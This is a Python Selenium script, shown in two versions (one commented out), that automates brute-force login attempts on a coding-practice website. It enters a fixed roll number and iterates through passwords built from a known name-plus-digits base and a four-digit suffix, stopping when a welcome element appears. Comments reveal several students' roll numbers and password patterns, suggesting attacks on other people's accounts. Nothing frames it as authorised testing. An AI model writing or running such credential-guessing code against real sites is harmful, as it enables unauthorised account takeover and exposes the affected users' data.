# from selenium import webdriver
# from selenium.webdriver.chrome.service import Service
# from selenium.webdriver.common.by import By
# import time

# # Constants for roll number and URL
# ROLL_NUMBER = "2410990180"  # Roll number to be used for login
# PASSWORD_BASE = "arpit0180"  # Base for password
# BASE_URL = "https://code.drishtii.live/"
# START_CODE = 4300
# END_CODE = 4350

# # Path to your ChromeDriver
# CHROME_DRIVER_PATH = r"C:\Users\Acer\Desktop\chromedriver-win64\chromedriver.exe"

# # Optional: Path to Chrome browser (only if Selenium can't detect Chrome automatically)
# CHROME_BINARY_PATH = r"C:\Users\Acer\Desktop\chrome-win64\chrome.exe"

# # Set up the web driver using Service
# service = Service(CHROME_DRIVER_PATH)
# options = webdriver.ChromeOptions()

# # Uncomment the following line if Chrome isn't detected and you need to specify the path to Chrome
# # options.binary_location = CHROME_BINARY_PATH

# # Initialize the Chrome WebDriver using the Service object
# driver = webdriver.Chrome(service=service, options=options)

# # Open the target website
# driver.get(BASE_URL)

# # Find the input fields for roll number and password
# roll_number_field = driver.find_element(By.NAME, "roll")  # Adjust this selector as needed
# password_field = driver.find_element(By.NAME, "pwd")   # Adjust this selector as needed
# login_button = driver.find_element(By.XPATH, "//button[@type='submit']")  # Adjust the XPATH if needed

# # Function to try logging in
# def try_login(password):
#     roll_number_field.clear()
#     password_field.clear()

#     # Fill in the roll number and password fields
#     roll_number_field.send_keys(ROLL_NUMBER)  # Use 2010990196 as the roll number
#     password_field.send_keys(password)

#     # Click the login button
#     login_button.click()

#     # Wait for a while to see if login is successful
#     time.sleep(0.1)

#     # Check if login was successful by inspecting some element on the page that appears only after logging in
#     # (Adjust this part based on how the success/failure is detected on the website)
#     try:
#         # Example: Check if an element that appears only on a successful login is present
#         driver.find_element(By.XPATH, "//div[@class='success-class']")
#         print(f"Login successful with password: {password}")
#         return True
#     except:
#         return False

# # Try all possible password combinations
# for code in range(START_CODE, END_CODE + 1):
#     password_attempt = f"{PASSWORD_BASE}#{code:04d}"  # Use the required pattern "bhavyam0196#xxxx"
#     print(f"Trying password: {password_attempt}")

#     if try_login(password_attempt):
#         print(f"Correct password found: {password_attempt}")
#         break
# else:
#     print("Password not found in the range.")

# # Close the browser after testing
# driver.quit()



























from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
import time

# Constants for roll number and URL
ROLL_NUMBER = "2410990196"  # Roll number to be used for login
PASSWORD_BASE = "bhavyam0196"  # Base for password
BASE_URL = "https://code.drishtii.live/"
START_CODE = 7000
END_CODE = 7600

# Path to your ChromeDriver
CHROME_DRIVER_PATH = r"C:\Users\Acer\Desktop\chromedriver-win64\chromedriver.exe"

# Optional: Path to Chrome browser (only if Selenium can't detect Chrome automatically)
CHROME_BINARY_PATH = r"C:\Users\Acer\Desktop\chrome-win64\chrome.exe"

# Set up the web driver using Service
service = Service(CHROME_DRIVER_PATH)
options = webdriver.ChromeOptions()

# Uncomment the following line if Chrome isn't detected and you need to specify the path to Chrome
# options.binary_location = CHROME_BINARY_PATH

# Initialize the Chrome WebDriver using the Service object
driver = webdriver.Chrome(service=service, options=options)

# Open the target website
driver.get(BASE_URL)

# Function to try logging in
def try_login(password):
    # Re-locate the input fields inside the function to avoid stale element reference
    roll_number_field = driver.find_element(By.NAME, "roll")  # Adjust this selector as needed
    password_field = driver.find_element(By.NAME, "pwd")   # Adjust this selector as needed
    login_button = driver.find_element(By.XPATH, "//button[@type='submit']")  # Adjust the XPATH if needed

    # Clear previous entries and enter new credentials
    roll_number_field.clear()
    password_field.clear()

    # Fill in the roll number and password fields
    roll_number_field.send_keys(ROLL_NUMBER)
    password_field.send_keys(password)

    # Click the login button
    login_button.click()

    # Wait for a while to see if login is successful
    time.sleep(0.01)  # Increase the wait time if necessary

    # Check if login was successful by inspecting some element on the page that appears only after logging in
    # (Adjust this part based on how the success/failure is detected on the website)
    try:
        # Adjust the selector here to check for an actual successful login indicator
        driver.find_element(By.XPATH, "//div[contains(text(), 'Welcome')]")  # Change this to the appropriate text or element
        print(f"Login successful with password: {password}")
        return True
    except:
        return False

# Try all possible password combinations
for code in range(START_CODE, END_CODE + 1):
    password_attempt = f"{PASSWORD_BASE}#{code:04d}"  # Use the required pattern "abhijeet0165#xxxx"
    print(f"Trying password: {password_attempt}")

    if try_login(password_attempt):
        print(f"Correct password found: {password_attempt}")
        break
else:
    print("Password not found in the range.")

# Close the browser after testing
driver.quit()
